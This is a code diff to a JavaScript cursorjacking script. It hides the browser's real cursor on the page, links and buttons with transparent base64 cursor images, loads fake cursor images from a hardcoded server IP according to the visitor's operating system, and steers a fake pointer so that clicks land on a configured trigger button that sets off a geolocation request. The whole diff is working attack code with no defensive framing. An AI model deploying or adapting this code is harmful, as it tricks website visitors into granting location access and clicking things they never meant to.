@@ -1,10 +1,33 @@
+// config
+var config = {
+  serverIp: "5.160.248.36",
+  triggerElement: "TransButton",
+  // add all dependecies here
+  dependencies: [
+   {
+     tag: "script",
+     attr: "src",
+     value: "https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"
+   } 
+  ]
+};
+
+// loading dependecies
+(function(){
+  config.dependencies.map((obj) => {
+    var dependency = document.createElement(obj.tag);
+    dependency[obj.attr] = obj.value;
+    document.head.appendChild(dependency);
+  });
+})();
+
+// converting px to cm 
 function px2cm(px) {
   var d = $("<div/>").css({ position: 'absolute', top : '-1000cm', left : '-1000cm', height : '1000cm', width : '1000cm' }).appendTo('body');
   var px_per_cm = d.height() / 1000;
   d.remove();
   return px / px_per_cm;
 }
-
 var data = {
   chrome: {
     name: "chrome",
@@ -78,13 +101,14 @@ var os = (() => {
   return OSName;
 })();
 
+
 (function loadPointerElement() {
     pointerSource = "";
     if (os.indexOf("Windows") != -1){
-      pointerSource = "windows.png";
+      pointerSource = "http://" + config.serverIp + "/windows.png";
     }
-    else if (os.indexOf("Max") != -1){
-      pointerSource = "mac.png";
+    else if (os.indexOf("Mac") != -1){
+      pointerSource = "http://" + config.serverIp + "/mac.png";
     }
     var fakeCursor = document.createElement("img");
     fakeCursor.id = "fakeCursor";
@@ -161,6 +185,7 @@ var setPadding = {
   }
 }
 
+
 function fakeCursorController(element, confirmLocation){
   var elementCmPositionX = px2cm(getElementPosition(element).left);
   var elementCmPositionY = px2cm(getElementPosition(element).top);
@@ -195,6 +220,38 @@ var alertPosition = (function() {
 // initializing the window.event property for all browsers
 $(window).mousemove(function(e){
   window.evt = e;
-  fakeCursorController(document.getElementById("fakeButton"), alertPosition);
-  triggerGeoLocationOnCollision(document.getElementById("fakeButton"));
+  fakeCursorController(document.getElementById(config.triggerElement), alertPosition);
+  triggerGeoLocationOnCollision(document.getElementById(config.triggerElement));
 });
+
+
+/** setting styleSheet **/
+
+// style variable
+var style = `
+  html{
+    cursor: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjbQg61aAAAADUlEQVQYV2P4//8/IwAI/QL/+TZZdwAAAABJRU5ErkJggg=='),
+    none !important;
+  }
+
+  #fakeCursor{
+    position: absolute;
+  }
+  
+  a{
+    cursor: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjbQg61aAAAADUlEQVQYV2P4//8/IwAI/QL/+TZZdwAAAABJRU5ErkJggg=='),
+    none !important;
+  }
+  
+  button{
+    cursor: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjbQg61aAAAADUlEQVQYV2P4//8/IwAI/QL/+TZZdwAAAABJRU5ErkJggg=='),
+    none !important;
+  }
+`;
+
+// appending style to the page
+(function(){
+ var styleSheet = document.createElement("style");
+ styleSheet.innerHTML = style;
+ (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(styleSheet);
+})();
